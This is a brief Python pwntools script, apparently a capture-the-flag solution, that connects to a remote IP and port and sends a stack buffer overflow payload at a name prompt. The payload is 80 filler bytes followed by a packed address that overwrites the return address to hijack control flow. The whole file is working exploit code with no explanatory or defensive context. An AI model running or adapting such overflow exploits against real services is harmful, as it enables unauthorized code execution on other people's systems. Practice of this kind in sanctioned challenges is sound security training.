from pwn import *

r = remote('61.28.237.24', 30204)

print(r.recvuntil('Please enter your name: '))
payload = b'a' * 80
payload += p32(0x8048506)
r.sendline(payload)
print(r.recv(1024))
print(r.recvall())